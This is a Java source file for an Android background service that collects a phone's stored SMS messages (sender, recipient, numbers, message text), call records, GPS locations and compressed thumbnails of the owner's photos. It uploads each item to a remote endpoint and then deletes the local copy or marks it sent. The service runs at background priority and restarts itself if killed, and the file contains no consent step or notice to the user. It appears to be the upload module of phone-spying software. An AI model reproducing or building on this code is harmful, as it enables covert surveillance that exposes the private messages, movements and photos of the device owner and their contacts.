package net.deerhunter.ars.protocol;

import java.io.ByteArrayOutputStream;
import java.io.IOException;

import net.deerhunter.ars.protocol.packets.CallPacket;
import net.deerhunter.ars.protocol.packets.DataType;
import net.deerhunter.ars.protocol.packets.LocationPacket;
import net.deerhunter.ars.protocol.packets.MainPacket;
import net.deerhunter.ars.protocol.packets.SMSPacket;
import net.deerhunter.ars.protocol.packets.ThumbnailPacket;
import net.deerhunter.ars.providers.ActivityContract;
import net.deerhunter.ars.providers.ActivityContract.Thumbnails;
import android.annotation.SuppressLint;
import android.app.Service;
import android.content.ContentResolver;
import android.content.ContentValues;
import android.content.Intent;
import android.database.Cursor;
import android.graphics.Bitmap;
import android.graphics.Bitmap.CompressFormat;
import android.graphics.BitmapFactory;
import android.os.Bundle;
import android.os.Handler;
import android.os.HandlerThread;
import android.os.IBinder;
import android.os.Looper;
import android.os.Message;
import android.os.Process;
import android.provider.MediaStore;

/**
 * Created with IntelliJ IDEA. User: DeerHunter Date: 17.10.12 Time: 21:21 To
 * change this template use File | Settings | File Templates.
 */
public class PacketSenderService extends Service {

	private Looper serviceLooper;
	private ServiceHandler serviceHandler;

	// Handler that receives messages from the thread
	@SuppressLint("HandlerLeak")
	private final class ServiceHandler extends Handler {
		public ServiceHandler(Looper looper) {
			super(looper);
		}

		@Override
		public void handleMessage(Message msg) {

			sendNewSMS();

			sendNewCalls();

			sendNewLocations();

			sendNewThumbnails();

			// Stop the service using the startId, so that we don't stop
			// the service in the middle of handling another job
			stopSelf(msg.arg1);
		}

		private void sendNewLocations() {
			try {
				ContentResolver cr = getContentResolver();

				// Return all the saved locations
				Cursor c = cr.query(ActivityContract.Locations.CONTENT_URI, null, null, null, null);

				while (c.moveToNext()) {
					int id = c.getInt(ActivityContract.Locations._ID_COLUMN);
					double latitude = c.getDouble(ActivityContract.Locations.LATITUDE_COLUMN);
					double longitude = c.getDouble(ActivityContract.Locations.LONGITUDE_COLUMN);
					double altitude = c.getDouble(ActivityContract.Locations.ALTITUDE_COLUMN);
					float accuracy = c.getFloat(ActivityContract.Locations.ACCURACY_COLUMN);
					String provider = c.getString(ActivityContract.Locations.PROVIDER_COLUMN);
					long time = c.getLong(ActivityContract.Locations.TIME_COLUMN);

					LocationPacket location = new LocationPacket(latitude, longitude, altitude, accuracy, provider,
							time);

					boolean uploaded = Uploader
							.sendPacket(new MainPacket(DataType.LOCATION, location.getBinaryPacket()));

					if (uploaded)
						cr.delete(ActivityContract.Locations.CONTENT_URI, "_id = ?", new String[] { "" + id });

				}

			} catch (IOException e) {
				e.printStackTrace();
			}
		}

		private void sendNewThumbnails() {
			try {
				ContentResolver cr = getContentResolver();

				// Return new saved images
				String where = Thumbnails.DELETED + " = 0 AND " + Thumbnails.THUMBNAIL_SENT + " = 0 AND "
						+ Thumbnails.FULL_IMAGE_SENT + " = 0";
				Cursor c = cr.query(ActivityContract.Thumbnails.CONTENT_URI, new String[] { Thumbnails.MEDIASTORE_ID,
						Thumbnails._ID }, where, null, null);
				while (c.moveToNext()) {
					int storeId = c.getInt(0); // save store_id;
					Cursor imageInfoCursor = cr.query(MediaStore.Images.Media.EXTERNAL_CONTENT_URI, new String[] {
							MediaStore.Images.Media.DISPLAY_NAME, MediaStore.Images.Media.DATA, MediaStore.Images.Media.DATE_ADDED }, "_id = ?",
							new String[] { String.valueOf(storeId) }, null);
					imageInfoCursor.moveToFirst();
					if (imageInfoCursor.getCount() == 0) { // file is not found
						ContentValues value = new ContentValues();
						value.put(Thumbnails.DELETED, "1");
						cr.update(ActivityContract.Thumbnails.CONTENT_URI, value, Thumbnails.MEDIASTORE_ID + " = ?",
								new String[] { String.valueOf(storeId) });
					} else { // file is present
						String displayName = imageInfoCursor.getString(0);
						String filePath = imageInfoCursor.getString(1);
						long dateAdded = imageInfoCursor.getLong(2);
						BitmapFactory.Options bitmapOptions = new BitmapFactory.Options();
						bitmapOptions.inSampleSize = 2;
						Bitmap thumbnail = MediaStore.Images.Thumbnails.getThumbnail(cr, storeId,
								MediaStore.Images.Thumbnails.MINI_KIND, bitmapOptions);
						if (thumbnail == null) { // some problems with creating
													// new thumbnail
							continue;
						}
						ByteArrayOutputStream outputStream = new ByteArrayOutputStream(10000);
						thumbnail.compress(CompressFormat.JPEG, 50, outputStream);

						ThumbnailPacket thumbnailPacket = new ThumbnailPacket(displayName, filePath, storeId, dateAdded,
								outputStream.toByteArray());

						boolean uploaded = Uploader.sendPacket(new MainPacket(DataType.THUMBNAIL, thumbnailPacket
								.getBinaryPacket()));

						if (uploaded) {
							ContentValues value = new ContentValues();
							value.put(Thumbnails.THUMBNAIL_SENT, "1");
							cr.update(ActivityContract.Thumbnails.CONTENT_URI, value, Thumbnails._ID + " = ?",
									new String[] { String.valueOf(c.getInt(1)) });
						}
					}
				}

			} catch (IOException e) {
				e.printStackTrace();
			}
		}

		private void sendNewCalls() {
			try {
				ContentResolver cr = getContentResolver();

				// Return all the saved calls
				Cursor c = cr.query(ActivityContract.Calls.CONTENT_URI, null, null, null, null);

				while (c.moveToNext()) {
					int id = c.getInt(ActivityContract.Calls._ID_COLUMN);
					String caller = c.getString(ActivityContract.Calls.CALLER_COLUMN);
					String recipient = c.getString(ActivityContract.Calls.RECIPIENT_COLUMN);
					String caller_phone_number = c.getString(ActivityContract.Calls.CALLER_PHONE_NUMBER_COLUMN);
					String recipient_phone_number = c.getString(ActivityContract.Calls.RECIPIENT_PHONE_NUMBER_COLUMN);
					long time = c.getLong(ActivityContract.Calls.TIME_COLUMN);

					CallPacket call = new CallPacket(caller, recipient, caller_phone_number, recipient_phone_number,
							time);

					boolean uploaded = Uploader.sendPacket(new MainPacket(DataType.CALL, call.getBinaryPacket()));

					if (uploaded)
						cr.delete(ActivityContract.Calls.CONTENT_URI, "_id = ?", new String[] { "" + id });

				}

			} catch (IOException e) {
				e.printStackTrace();
			}
		}

		private void sendNewSMS() {
			try {
				ContentResolver cr = getContentResolver();

				// Return all the saved sms
				Cursor c = cr.query(ActivityContract.SMS.CONTENT_URI, null, null, null, null);

				while (c.moveToNext()) {
					int id = c.getInt(ActivityContract.SMS._ID_COLUMN);
					String sender = c.getString(ActivityContract.SMS.SENDER_COLUMN);
					String recipient = c.getString(ActivityContract.SMS.RECIPIENT_COLUMN);
					String sender_phone_number = c.getString(ActivityContract.SMS.SENDER_PHONE_NUMBER_COLUMN);
					String recipient_phone_number = c.getString(ActivityContract.SMS.RECIPIENT_PHONE_NUMBER_COLUMN);
					long time = c.getLong(ActivityContract.SMS.TIME_COLUMN);
					String sms_body = c.getString(ActivityContract.SMS.SMS_BODY_COLUMN);

					SMSPacket sms = new SMSPacket(sender, recipient, sender_phone_number, recipient_phone_number, time,
							sms_body);

					boolean uploaded = Uploader.sendPacket(new MainPacket(DataType.SMS, sms.getBinaryPacket()));

					if (uploaded)
						cr.delete(ActivityContract.SMS.CONTENT_URI, "_id = ?", new String[] { "" + id });

				}

			} catch (IOException e) {
				e.printStackTrace(); // To change body of catch statement use
										// File | Settings | File Templates.
			}
		}

	}

	@Override
	public void onCreate() {
		// Start up the thread running the service. Note that we create a
		// separate thread because the service normally runs in the process's
		// main thread, which we don't want to block. We also make it
		// background priority so CPU-intensive work will not disrupt our UI.
		HandlerThread thread = new HandlerThread("ServiceStartArguments", Process.THREAD_PRIORITY_BACKGROUND);
		thread.start();

		// Get the HandlerThread's Looper and use it for our Handler
		serviceLooper = thread.getLooper();
		serviceHandler = new ServiceHandler(serviceLooper);
	}

	@Override
	public int onStartCommand(Intent intent, int flags, int startId) {
		// For each start request, send a message to start a job and deliver the
		// start ID so we know which request we're stopping when we finish the
		// job
		Message msg = serviceHandler.obtainMessage();
		msg.arg1 = startId;

		Bundle fileData = intent.getExtras();
		msg.setData(fileData);

		serviceHandler.sendMessage(msg);

		// If we get killed, after returning from here, restart
		return START_STICKY;
	}

	@Override
	public IBinder onBind(Intent intent) {
		// We don't provide binding, so return null
		return null;
	}

	@Override
	public void onDestroy() {
	}
}
